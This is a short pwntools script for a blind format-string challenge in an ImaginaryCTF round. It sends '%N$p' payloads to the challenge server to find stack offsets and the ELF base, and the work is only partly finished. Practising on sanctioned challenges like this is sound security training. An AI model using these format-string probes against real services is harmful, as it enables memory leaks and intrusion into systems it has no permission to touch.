# for imaginary ctf round 23 blind pwn

#https://chowdera.com/2021/12/20211205114408153U.html
#https://introspelliam.github.io/2018/04/20/pwn/blind-attack-HITB-XCTF-Quals-2018-babypwn/

from pwn import *
#context.log_level='debug'
p = connect("puzzler7.imaginaryctf.org", 2001)

# approach 1: leak the entire binary with fmtstr
# approach 2: attempt to find 0x40000 through fmtstr bruteforce
prompt = 'Tell me something \n'
write_fmt_offset = 10

def exec_payload(payload):
    if '\n' in payload:
        return ""
    p.sendlineafter(prompt, "_EOF" + payload)
    p.recvuntil("_EOF")
    data = p.recvuntil("\n")
    p.sendlineafter("What is the secret", b"\x00")
    p.recvline()
    return data

def find_elf(depth):
    log.info('Finding ELF. This might take a few seconds...')
    for i in range(1, depth + 1):
        log.info(f'Attempting offset {i}:')
        data = exec_payload('%' + str(i) + '$p')
        if (len(data) == 8 and data[0:5] == '0x400'):
            log.success('FOUND ELF !')
            return int(data, 16)

DEPTH = 100
#elf_start = find_elf(DEPTH)
#log.info(f"Using address {hex(elf_start)}")

def find_leak_point():
    log.info('Finding leak point')
    for i in range(1, 200):
        log.info(f'Attempting offset {i}:')
        r = exec_payload('%' + str(i) + '$p' + 'AAAAAAAA' + 'BBBBBBBB')
        if b'0x4242424242424242' in r: # chr(0x42) = 'B'
            return i

leak_offset = find_leak_point()
log.info(leak_offset)

p.interactive()
